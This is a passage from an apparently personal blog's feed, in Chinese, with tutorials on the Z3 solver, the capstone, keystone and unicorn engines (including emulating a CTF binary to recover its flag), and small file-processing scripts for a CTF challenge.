    <content type="html"><![CDATA[<hr><hr><h1 id="等式问题与-z3-的使用"><a href="#等式问题与-z3-的使用" class="headerlink" title="等式问题与 z3 的使用"></a><strong>等式问题与</strong> <strong>z3</strong> <strong>的使用</strong></h1><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a><strong>基本数据类型</strong></h3><p>在Python中使用 Z3 模块，我们的所求结果一般有以下几种数据类型：</p><ul><li><p><strong>Int</strong></p></li><li><p>Real</p></li><li><p>Bool</p></li><li><p>Array</p></li><li><p><strong>BitVec(‘a’, 8)</strong></p></li></ul><p>其中 BitVec 可以是特定大小的数据类型，不一定是 8 位，例如 C 语言中的 int 型可以用 BitVec(‘a’, 32)</p><p>表示。</p><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a><strong>基本语句</strong></h3><p>在 Python 中使用该模块，我们通常用到如下几个 API：</p><ul><li><p>**Solver()**：创建一个通用求解器，以进行下一步的求解</p></li><li><p>**add()**：添加约束条件，通常在solver()命令之后，添加的约束条件通常是一个逻辑等式</p></li><li><p>**check()**：添加完约束条件后，用来来检测解的情况，有解的时候会返回 sat，无解的时候会返回unsat</p></li><li><p>**model()**：在存在解的时候，该函数会将每个限制条件所对应的解集的交集，进而得出正解</p></li></ul><p>分别对应设未知数，列方程组，判断方程是否有解，解方程组。</p><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a><strong>简单使用</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165337491.png" alt="image-20240302165337491"></p><h3 id="入门实践"><a href="#入门实践" class="headerlink" title="入门实践"></a><strong>入门实践</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">c = Int(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Int(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(b == a - <span class="number">2</span>)</span><br><span class="line">s.add(d == c + <span class="number">2</span>)</span><br><span class="line">s.add(d == a + <span class="number">5</span>)</span><br><span class="line">s.add(b - <span class="number">20</span> + c - <span class="number">20</span> == <span class="number">15</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line"><span class="comment"># _solve = s.model()</span></span><br><span class="line"><span class="comment"># print(_solve)</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240302165540789.png" alt="image-20240302165540789"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">code = [Int(<span class="built_in">str</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GoodValueBadPlace</span>(<span class="params">nums, count</span>):</span><br><span class="line">    exps = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                exps.append(If(nums[i] == code[j], <span class="number">1</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> Sum(exps) == count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># one number is correct and well-placed</span></span><br><span class="line">s.add(Or(code[<span class="number">0</span>] == <span class="number">2</span>, code[<span class="number">1</span>] == <span class="number">9</span>, code[<span class="number">2</span>] == <span class="number">1</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>], <span class="number">1</span>))</span><br><span class="line"><span class="comment"># two numbers are correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>], <span class="number">2</span>))</span><br><span class="line"><span class="comment"># nothing is correct</span></span><br><span class="line">s.add(And(code[<span class="number">0</span>] != <span class="number">5</span>, code[<span class="number">1</span>] != <span class="number">7</span>, code[<span class="number">2</span>] != <span class="number">9</span>))</span><br><span class="line"><span class="comment"># one number is correct but wrong placed</span></span><br><span class="line">s.add(GoodValueBadPlace([<span class="number">5</span>, <span class="number">6</span>, <span class="number">9</span>], <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> code:</span><br><span class="line">        <span class="built_in">print</span>(m[c], end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;hr&gt;
&lt;h1 id=&quot;等式问题与-z3-的使用&quot;&gt;&lt;a href=&quot;#等式问题与-z3-的使用&quot; class=&quot;headerlink&quot; title=&quot;等式问题与 z3 的使用&quot;&gt;&lt;/a&gt;&lt;strong&gt;等式问题与&lt;/strong&gt; &lt;strong&gt;z3&lt;/stron</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>capstone、keystone与unicorn-1</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/</id>
    <published>2024-02-29T16:00:00.000Z</published>
    <updated>2024-03-02T08:40:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="capstone、keystone与unicorn-1"><a href="#capstone、keystone与unicorn-1" class="headerlink" title="capstone、keystone与unicorn-1"></a>capstone、keystone与unicorn-1</h1><h2 id="capstone"><a href="#capstone" class="headerlink" title="capstone"></a><strong>capstone</strong></h2><p>加坡南洋理工大学团队在 Blackhat USA 2014 上发布的一个反汇编引擎。</p><p>安装： pip install capstone</p><h3 id="基础示例"><a href="#基础示例" class="headerlink" title="基础示例"></a><strong>基础示例</strong></h3><p>capstone 的 API 使用起来非常简单，因此使用该框架编写工具非常容易。 下面的代码反汇编一些 x86机器码，并打印出汇编语句。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line">   </span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><p>以下是每一行代码的解释：</p><p>第 1 行：导入 Python 模块 capstone。</p><p>第 3 行：要反汇编的原始二进制代码。</p><p>第 5 行：使用类 Cs 为 capstone 初始化 Python 类。 需要给这个类两个参数：硬件架构和硬件模式。</p><p>在此示例中，我们要反汇编 x86 体系结构的 64 位代码。</p><p>第 6 行：使用上面创建的 Cs 类实例的方法 disasm() 反汇编二进制代码。 disasm 的第二个参数是第一</p><p>条指令的地址，在本例中为 0x1000。 默认情况下，disasm 反汇编所有代码，直到没有更多代码或遇</p><p>到不可解释的指令。 disasm 返回一个类型为 CsInsn 的指令列表，这里的 for 循环会迭代这个列表。</p><p>第 7 行：打印出每条指令的一些内部信息。 CsInsn 类公开了反汇编指令的所有内部信息。 下面介绍了</p><p>此类中一些最常用的属性。</p><p>&#x2F;&#x2F;&#x2F;想起来了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 从文件中读取十六进制字符串</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节序列</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节序列写入文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># 输出文件为二进制文件，因为十六进制是字节数据</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229202523536.png" alt="image-20240229202523536"></p><h3 id="更高效的-API"><a href="#更高效的-API" class="headerlink" title="更高效的 API"></a><strong>更高效的</strong> <strong>API</strong></h3><p>上个示例中使用 disasm() 方法获取 CsInsn 对象。这提供了可用于反汇编指令的完整信息。但是，如果我们只需要地址、大小、助记符和 op_str 等基本数据，我们可以使用更轻量级的 API disasm_lite 。</p><p>下面是 disasm_lite 示例</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> address, size, mnemonic, op_str <span class="keyword">in</span> md.disasm_lite(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(address, mnemonic, op_str))</span><br></pre></td></tr></table></figure><h3 id="架构和模式"><a href="#架构和模式" class="headerlink" title="架构和模式"></a><strong>架构和模式</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204045467.png" alt="image-20240229204045467"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204054519.png" alt="image-20240229204054519"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x56\x34\x21\x34\xc2\x17\x01\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS64 + CS_MODE_LITTLE_ENDIAN)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><h2 id="keystone"><a href="#keystone" class="headerlink" title="keystone"></a><strong>keystone</strong></h2><p>pip install keystone-engine</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;mov eax, 3 \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub edx, eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><p>每行代码的注释：</p><p>第 1 行：在使用之前导入 keystone 模块。</p><p>第 3-5 行：要编译的汇编字符串。 此示例中的代码是 x86 32 位，采用 Intel 格式。 可以用 ; 或</p><p>\n 分隔此字符串中的汇编指令。</p><p>第 7 行：使用类 <strong>Ks</strong> 初始化 keystone。 这个类接受 2 个参数：硬件架构和硬件模式。 此示例处理</p><p>x86 体系结构的 32 位代码。</p><p>第 8 行：使用方法 <strong>asm</strong> 编译汇编指令。 该函数返回一个编码字节列表，以及 keystone 在编译过</p><p>程中处理的输入语句的数量。</p><p>第 9 行：打印出指令编码和处理的汇编语句数。</p><p>默认情况下，keystone 接受采用 Intel 语法的 x86 汇编。 如果要处理 x86 AT&amp;T 语法，可以简单地切换到语法 AT&amp;T，如下所示。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;movl $3, %eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub %eax, %edx \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp *%edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">ks.syntax = KS_OPT_SYNTAX_ATT <span class="comment"># 添加此行</span></span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a><strong>unicorn</strong></h3><p>unicorn 引擎的用处：</p><ul><li><p>从恶意软件中调用一个有趣的函数，而不会创建有害的进程</p></li><li><p>解决 CTF 赛题</p></li><li><p>模糊测试</p></li><li><p>模拟执行混淆代码</p></li></ul><h3 id="任务-1"><a href="#任务-1" class="headerlink" title="任务 1"></a><strong>任务</strong> <strong>1</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 当运行这个程序时，我们可以注意到它自己会打印 flag，但速度非常慢，flag 的每个下一个字节的计算速度越来越慢。这意味着有必要优化程序以获得 flag</span></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 这是一个递归函数，我们可以通过 unicorn 来对其进行优化。首先导入 unicorn 模块并实例化一个 Uc 对象：</span></span><br><span class="line">mu = Uc(UC_ARCH_X86,UC_MODE_64)</span><br><span class="line"><span class="comment"># 要使用 unicorn，我们需要手动初始化虚拟内存。 对于这个二进制文件，需要在某处编写代码并分配一个堆栈。二进制文件的基址是 0x400000。 假设堆栈将从地址 0x0 开始，大小为 1024*1024。</span></span><br><span class="line"><span class="comment"># 我们可以通过调用 mem_map 方法来映射一片内存。</span></span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"><span class="comment"># 现在，我们需要在基地址加载二进制文件，就像加载程序一样，然后将 RSP 设置为指向堆栈的末尾</span></span><br><span class="line">mu.mem_write(BASE, <span class="built_in">open</span>(<span class="string">&quot;./fibonacci&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># 来添加一个 hook 监听模拟过程，看看是哪个语句产生了内存访问错误：</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(mu.mem_read(address, size), <span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(address), ins.mnemonic, ins.op_str)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"><span class="comment"># 我们可以启动仿真并运行我们的代码，但需要知道起始地址是什么以及仿真器应该在哪里停止。考虑从地址 0x4004E0 开始模拟代码（main 函数首地址），结尾可以是 0x400575：</span></span><br><span class="line">mu.emu_start(<span class="number">0x4004E0</span>, <span class="number">0x400575</span>)</span><br><span class="line"><span class="comment"># 运行却产生了报错：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Traceback (most recent call last):</span></span><br><span class="line"><span class="string">File &quot;solve.py&quot;, line 15, in &lt;module&gt;</span></span><br><span class="line"><span class="string">mu.emu_start(0x4004E0, 0x400575)</span></span><br><span class="line"><span class="string">File &quot;python38\lib\site-packages\unicorn\unicorn.py&quot;, line 547, in emu_start</span></span><br><span class="line"><span class="string">raise UcError(status)</span></span><br><span class="line"><span class="string">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;这段代码添加了一个钩子。我们定义了自己的函数 hook_code，它在每条指令的仿真之前被调用。它需</span></span><br><span class="line"><span class="string">要以下参数：</span></span><br><span class="line"><span class="string">Uc 实例</span></span><br><span class="line"><span class="string">指令地址</span></span><br><span class="line"><span class="string">指令大小</span></span><br><span class="line"><span class="string">用户数据（我们可以在 hook_add() 的可选参数中传递这个值）&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 添加的在里面了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x4004e0 push rbp</span></span><br><span class="line"><span class="string">0x4004e1 push rbx</span></span><br><span class="line"><span class="string">0x4004e2 xor esi, esi</span></span><br><span class="line"><span class="string">0x4004e4 mov ebp, 0x4007e1</span></span><br><span class="line"><span class="string">0x4004e9 xor ebx, ebx</span></span><br><span class="line"><span class="string">0x4004eb sub rsp, 0x18</span></span><br><span class="line"><span class="string">0x4004ef mov rdi, qword ptr [rip + 0x200b42]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229212524751.png" alt="image-20240229212524751"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line"><span class="keyword">if</span> address <span class="keyword">in</span> [<span class="number">0x4004EF</span>, <span class="number">0x4004F6</span>, <span class="number">0x400502</span>, <span class="number">0x40054F</span>, <span class="number">0x400560</span>]:</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line"><span class="keyword">if</span> address == <span class="number">0x400560</span>:</span><br><span class="line">value = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;capstone、keystone与unicorn-1&quot;&gt;&lt;a href=&quot;#capstone、keystone与unicorn-1&quot; class=&quot;headerlink&quot; title=&quot;capstone、keystone与unicorn-1&quot;&gt;&lt;/a&gt;capst</summary>
      
    
    
    
    
    <category term="逆向、乐" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91%E3%80%81%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>qsnCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/</id>
    <published>2024-02-28T16:00:00.000Z</published>
    <updated>2024-03-02T08:34:15.806Z</updated>
    
    <content type="html"><![CDATA[<p>分出字节码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_columns</span>(<span class="params">input_file, output_file, start_column, end_column</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> input_f:</span><br><span class="line">                <span class="comment"># 提取指定列的字符并写入输出文件</span></span><br><span class="line">                extracted_text = line[start_column - <span class="number">1</span>:end_column]  <span class="comment"># Python 的索引从0开始，所以需要减1</span></span><br><span class="line">                output_f.write(extracted_text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;./22.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;./11.txt&#x27;</span></span><br><span class="line">start_column = <span class="number">21</span></span><br><span class="line">end_column = <span class="number">68</span></span><br><span class="line"></span><br><span class="line">extract_columns(input_file, output_file, start_column, end_column)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逆转</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_content</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        content = input_f.read()</span><br><span class="line"></span><br><span class="line">    reversed_content = content[::-<span class="number">1</span>]  <span class="comment"># 使用切片操作逆转字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">        output_f.write(reversed_content)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;11.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;22.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">reverse_content(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>去除空格和换行符</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">remove_whitespace_and_newlines</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        content = input_f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除空格和换行符</span></span><br><span class="line">    content = content.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">        output_f.write(content)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;22.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;11.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">remove_whitespace_and_newlines(input_file, output_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件读取十六进制，转换为文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 